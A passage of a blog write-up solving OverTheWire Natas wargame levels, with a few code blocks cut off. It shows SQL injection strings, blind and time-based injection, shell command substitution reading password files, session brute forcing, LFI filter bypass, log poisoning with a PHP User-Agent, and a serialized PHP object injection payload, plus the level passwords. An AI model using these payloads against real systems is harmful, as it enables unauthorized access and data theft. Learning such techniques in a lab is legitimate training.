<p>The upload process is the same (don&rsquo;t forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters ÿØÿà before it, it&rsquo;s because the text representation of the jpg magic number is also echoed back. The password starts after that</p>

<h3>Level 14</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas14.png" title="natas14" alt="natas 14"></p>

<p>Looking at the code hints at what type of vulnerability can be exploited:</p>

<p>No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: <a href="http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass">http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass</a></p>

<p>And now there was a message showing the query that was run on the backend:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Executing query: SELECT * from users where username="test" and password="pass"
</span><span class='line'>Access denied!</span></code></pre></td></tr></table></div></figure>


<p>After seeing how the query looks like, I used the following injection string to fool the database:</p>

<p>username = can be anything</p>

<p>password = <code>pass" or 1=1&mdash; </code></p>

<p>To see why this works, look at the query now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Executing</span> <span class="n">query</span><span class="p">:</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="ss">&quot;test&quot;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="ss">&quot;pass&quot;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>&mdash; </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don&rsquo;t forget that you need to URL encode the space (%20)</p>

<p>After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>

<p>We can again see the query that is being run on the backend by manipulating the URL: <a href="http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16">http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"
</span><span class='line'>This user exists.</span></code></pre></td></tr></table></div></figure>


<p>So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can&rsquo;t inject in a way that would directly give us the password like previously, but we know the query will be run against the <em>users</em> table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY &ldquo;a%&rdquo;&mdash; </code>. Testing it in the URL (don&rsquo;t forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!</p>

<p>Some explanation about the SQL keywords:</p>

<ul>
<li><p>The AND operator displays a record if both the first condition AND the second condition are true.</p></li>
<li><p>The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.</p></li>
<li><p>The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant.</p></li>
<li><p><strong>%</strong>     A substitute for zero or more characters</p></li>
</ul>


<p>If you run this query with the debug parameter set, you will see how it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "</span></code></pre></td></tr></table></div></figure>


<p>When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here&rsquo;s a Python script to do the job:</p>

<p>Right, this is similar to level 9. This time, however, there is character filtering in place, so we can&rsquo;t use any of these: <code>;|&amp;`\&lsquo;&ldquo;</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for <a href="http://bash.cyberciti.biz/guide/Command_substitution">command substitution</a></p>

<p>Basically, you can use it to run a command and store its output in a variable or display it with the <em>echo</em> command. It looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo $(whoami)
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection</p>

<p>Let&rsquo;s test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Output:
</span><span class='line'>
</span><span class='line'>matrix
</span><span class='line'>matrix's
</span><span class='line'>matrixes</span></code></pre></td></tr></table></div></figure>


<p>The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let&rsquo;s imagine what happens if a is the first character of the password:</p>

<ul>
<li><p>the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn&rsquo;t exist, nothing is returned. So we know that if nothing is returned, we had a match</p></li>
<li><p>there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password</p></li>
</ul>


<p>To automate the injection process, I wrote a Python script again:</p>

<p>We know the database is vulnerable, but nothing is displayed to the screen, because the <em>echo</em> statements are commented out. So we&rsquo;re going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)&mdash; </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn&rsquo;t exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it&rsquo;s false. With this in mind, I modified the Python script I used before:</p>

<p>This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code></p>

<p>This is a lot of code, but first let&rsquo;s see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that&rsquo;s the way to go, but first to understand the code:</p>

<ul>
<li><p>the $maxid holds the maximum value of a PHPSESSID &ndash;> 640</p></li>
<li><p>isValidAdminLogin() just returns 0, so whenever it&rsquo;s called it will set the admin session ID to 0 (not what we want)</p></li>
<li><p>isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise</p></li>
<li><p>createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)</p></li>
<li><p>debug($msg) this just prints messages such as session started, etc.</p></li>
<li><p>my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn&rsquo;t exist in the $_SESSION array</p></li>
<li><p>print_credentials() prints the password we&rsquo;re after if there is an admin session ID that&rsquo;s set to 1 in the $_SESSION array. Otherwise it just prints a regular message</p></li>
</ul>


<p>Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:</p>

<p>I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code></p>

<h3>Level 19</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas19.png" title="natas19" alt="natas 19"></p>

<p>We don&rsquo;t have source code this time and apparently the session IDs aren&rsquo;t sequential anymore..Let&rsquo;s see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. <em>admin</em> was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code><em>random number-username</em></code>. So again, brute forcing to the rescue! Since I didn&rsquo;t know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:</p>

<p>This is similar to the previous challenges, we still need the $_SESSION array to contain a key named <em>admin</em> with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let&rsquo;s look at the debug output when we change our name: <a href="http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug">http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug</a></p>

<p>I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:</p>

<ul>
<li><p><strong>function mywrite($sid, $data)</strong> &ndash; after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like <em>mysess_SID</em>, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that <em>name</em> is the key and <em>admin</em> is the value. Then the key and value are written to the file as follows: <code>$data .= &ldquo;$key $value\n&rdquo;;</code>. So the data will look like this: <em>name admin</em> followed by a newline.</p></li>
<li><p><strong>function myread($sid)</strong> &ndash; this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file</p></li>
</ul>


<p>We want to focus on the <em>mywrite</em> function because that&rsquo;s the actual code that writes the data that we passed to the server. And the code that needs our attention is this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of <em>admin => 1</em>. And the <em>mywrite</em> function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter&hellip;what if we can inject another key / value pair after our initial input? We currently have this: <em>name => admin</em> by entering <em>admin</em> in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name admin
</span><span class='line'>admin 1</span></code></pre></td></tr></table></div></figure>


<p>Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&amp;name=admin%0Aadmin%201 and here&rsquo;s the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>If you turn on debug, you can see the contents of the $_SESSION array:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Again we want to insert the pair <em>admin => 1</em> in the array, but the code only allows those 3 keys, so we can&rsquo;t POST what we want. But if we look at this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>As long as the key <em>submit</em> exists in the $<em>REQUEST array, it will take the key / value pairs in the $</em>REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can&rsquo;t POST our values because of the validity checks. Reading through the PHP manual I saw this:</p>

<blockquote><p>$<em>REQUEST — An associative array that by default contains the contents of $</em>GET, $<em>POST and $</em>COOKIE.</p>

<p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
user and cannot be trusted.</p></blockquote>

<p>Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key <em>submit</em> exists. Instead of POST&#8217;ing, I modified the HTML using Firebug to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span></code></pre></td></tr></table></div></figure>


<p>On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Well, it looks like all you have to do is pass a GET parameter named <em>revelio</em> and receive the password. But if you&rsquo;re not an admin, you will just be redirected to the same page via a Location header. I couldn&rsquo;t think of a way to fool the page that I&rsquo;m admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>After receiving this response the browser made another request..but at this point it didn&rsquo;t matter :D</p>

<h3>Level 23</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas23.png" title="natas23" alt="natas 23"></p>

<p>Here we have to input a password to login. Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>    if(array_key_exists("passwd",$_REQUEST)){
</span><span class='line'>        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] &gt; 10 )){
</span><span class='line'>            echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
</span><span class='line'>            echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
</span><span class='line'>        }
</span><span class='line'>        else{
</span><span class='line'>            echo "&lt;br&gt;Wrong!&lt;br&gt;";
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>    // morla / 10111
</span><span class='line'>?&gt;  </span></code></pre></td></tr></table></div></figure>


<p>We will get the credentials if we enter a password that contains the string <em>iloveyou</em> and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the <a href="https://secure.php.net/manual/en/language.operators.comparison.php">Comparison Operators</a> section:</p>

<blockquote><p>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison
performed numerically.</p></blockquote>

<p><a href="https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion">So how is the string converted to a number?</a></p>

<blockquote><p>If the string does not contain any of the characters &lsquo;.&rsquo;, &lsquo;e&rsquo;, or &lsquo;E&rsquo; and the numeric value fits into integer type limits (as defined by
PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.</p>

<p>The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
value will be 0 (zero).</p></blockquote>

<p>So all we have to do is enter a password that starts with a number greater than 50, followed by the <em>iloveyou</em> string, something like <em>50iloveyou</em>:</p>

<p>This level is centered around exploiting the <em>strcmp</em> function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int strcmp ( string $str1 , string $str2 )
</span><span class='line'>Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal. </span></code></pre></td></tr></table></div></figure>


<p>When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check <a href="http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Chaotic Security blog</a> and the <a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">OWASP PHP security cheatsheet</a>. If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: <a href="http://natas24.natas.labs.overthewire.org/?passwd">http://natas24.natas.labs.overthewire.org/?passwd</a>[]=pwn</p>

<p>At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=&hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code></p>

<p>Excellent, now we&rsquo;re getting somewhere! The next technique we&rsquo;ll use to get the password is a log poisoning attack. Read more <a href="http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/">here</a></p>

<p>If you look at the <em>logRequest</em> function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let&rsquo;s see this in practice:</p>

<ul>
<li><p>I changed my user agent to <code>&lt;?php readfile(&lsquo;/etc/natas_webpass/natas26&rsquo;); ?></code></p></li>
<li><p>Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:</p></li>
</ul>

<p>Code looks complicated so I&rsquo;m breaking it down in little pieces:</p>

<ul>
<li><p>We have a Logger class that writes some messages to a log file</p></li>
<li><p>the <em>showImage()</em> function sets the image tag source to the given filename, if that file exists</p></li>
<li><p>the <em>drawImage()</em> function creates an image and outputs it to the browser</p></li>
<li><p><em>drawFromUserdata()</em> uses the user-supplied coordinates to draw lines across the image</p></li>
<li><p><em>storeData()</em> populates an array with the 4 $_GET parameters and sets a cookie named <em>drawing</em> to contain the serialized and base64 encoded value of the previously created array</p></li>
</ul>


<p>So far, out of ideas, but when reading about <em>unserialize()</em> in the PHP manual, there was a security warning:</p>

<blockquote><p>Warning</p>

<p>Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and
autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and
json_encode()) if you need to pass serialized data to the user.</p></blockquote>

<p>Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn&rsquo;t instantiated anywhere in the program. But first, we must understand what serialization is all about.</p>

<ul>
<li><p><em>string serialize ( mixed $value )</em></p></li>
<li><p>Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere.</p></li>
</ul>


<p><strong>Serialization</strong> is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc.</p>

<p><strong>Unserialization</strong> converts the string back to a PHP value</p>

<p>Now let&rsquo;s look at what OWASP says about the PHP object injection attack:</p>

<blockquote><p>The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP
allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP
object(s) injection into the application scope.</p>

<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>

<p>The application must have a class which implements a PHP magic method (such as <strong>wakeup or </strong>destruct) that can be used to carry out malicious
attacks, or to start a &ldquo;POP chain&rdquo;.</p>

<p>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
supported for such classes.</p></blockquote>

<p>Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a <em>__construct()</em> and <em>__destruct()</em> magic method. So the class wasn&rsquo;t just lying around for nothing in the code, hehehe!</p>

<p>Before continuing, I want to show an <a href="http://www.w3resource.com/php/function-reference/serialize.php">example of serialization</a>, so you can have an idea of what it looks like with an easier to understand example than deciphering the <em>drawing</em> cookie:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span><span class='line'><span class="k">echo</span>  <span class="nv">$serialized_data</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output is <code>a:3:{i:0;s:4:&ldquo;Math&rdquo;;i:1;s:8:&ldquo;Language&rdquo;;i:2;s:7:&ldquo;Science&rdquo;;}</code>. Ugh, looks complicated! But here it is:</p>

<ul>
<li><p>a = array, 3 = the number of elements in the array</p></li>
<li><p>i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well</p></li>
</ul>


<p>Now, to exploit this. We have:</p>

<ul>
<li><p>a way to inject our own code into the application (by changing the <em>drawing</em> cookie that will get unserialized)</p></li>
<li><p>a way to write to a file (leverage the Logger class)</p></li>
<li><p>a way to read a file (we can browse to where images are stored inside <em>img/</em>)</p></li>
</ul>


<p>First, I made my own malicious Logger class:</p>

<p>This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:</p>

<ul>
<li>serialized:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";}</span></code></pre></td></tr></table></div></figure>


<ul>
<li>base64 encoded:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=</span></code></pre></td></tr></table></div></figure>


<p>In my Logger class I just removed what wasn&rsquo;t necessary from the original code, and made the modifications so that the script will create a PHP file inside the <em>img/</em> directory, with this code inside it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">readfile</span><span class="p">(</span><span class="s1">&#39;/etc/natas_webpass/natas27&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p>

<p>Because I used <em>readfile()</em>, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that <em>file_get_contents()</em> is a better choice for reading a file into a string, but I was too lazy to change it!</p>

<blockquote><p>file_get_contents() is the preferred way to read the contents of a file into a string.</p></blockquote>

</span></code></pre></td></tr></table></div></figure>


<p>Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Welcome haxor!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; haxor [password] =&gt; doge ) </span></code></pre></td></tr></table></div></figure>


<p>I then tried to create a natas28 user to see what would happen&hellip;and surprise!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wrong password for user: natas28</span></code></pre></td></tr></table></div></figure>


<p>This tells us that there is indeed such a user in the database and that our random password doesn&rsquo;t match the one stored in the database..so that&rsquo;s what we want to get! I&rsquo;ve tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)</p>

<ul>
<li><p><em>checkCredentials()</em> checks if the provided username and password (which are both escaped) exist in the table, returning True if they are</p></li>
<li><p><em>validUser()</em> checks if the username is already in the table</p></li>
<li><p><em>dumpData()</em> prints the data about the array containing the username and password as seen above in the log in message</p></li>
<li><p><em>createUser()</em> inserts a new username-password pair in the table</p></li>
</ul>


<p>The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn&rsquo;t exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:</p>

<p>1) when giving a username that already exists, it continues to the credentials checking part</p>

<p>2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)</p>

<p>Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the <em>dumpData()</em> one (because it returns data from the database, so it&rsquo;s possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18.</p>

<p>I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;natas28&#39;</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="s">&#39;end&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">user</span>
</span><span class='line'><span class="s">&#39;natas28                                                                end&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome yo!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; yo [password] =&gt; ) </span></code></pre></td></tr></table></div></figure>


<p>Now I tried to create a user with that long string and yeah, the space is removed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User natas28 end was created!</span></code></pre></td></tr></table></div></figure>


<p>However, when next I tried to log in just as natas28 with no password, here is what awaited me!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome natas28!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; natas28 [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF ) </span></code></pre></td></tr></table></div></figure>


<p>Why was this possible? Remember the flow of the code when you try to log in:</p>

